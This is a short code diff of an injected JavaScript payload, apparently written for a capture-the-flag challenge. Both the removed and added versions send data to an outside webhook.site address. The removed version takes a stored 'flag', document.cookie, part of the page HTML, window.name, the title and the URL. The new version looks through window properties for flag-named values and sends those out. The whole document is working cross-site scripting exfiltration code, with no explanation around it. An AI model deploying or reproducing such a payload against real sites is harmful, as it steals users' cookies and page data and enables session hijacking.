@@ -1,16 +1,15 @@
 <script>
-function send(data) {
-  fetch("https://webhook.site/f2de2261-8f17-4a01-a07b-5997cf31f9cf/?data=" + encodeURIComponent(data));
-}
+  function send(data) {
+    fetch("https://webhook.site/f2de2261-8f17-4a01-a07b-5997cf31f9cf/?data=" + encodeURIComponent(data));
+  }
 
-try {
-  send("flag=" + localStorage.getItem("flag"));
-  send("cookie=" + document.cookie);
-  send("html=" + document.documentElement.innerHTML.slice(0, 500));
-  send("window.name=" + window.name);
-  send("title=" + document.title);
-  send("url=" + window.location.href);
-} catch(e) {
-  send("error=" + e.message);
-}
+  try {
+    for (let key in window) {
+      if (key.toLowerCase().includes("flag")) {
+        send(`${key} = ${window[key]}`);
+      }
+    }
+  } catch (e) {
+    send("error=" + e.message);
+  }
 </script>
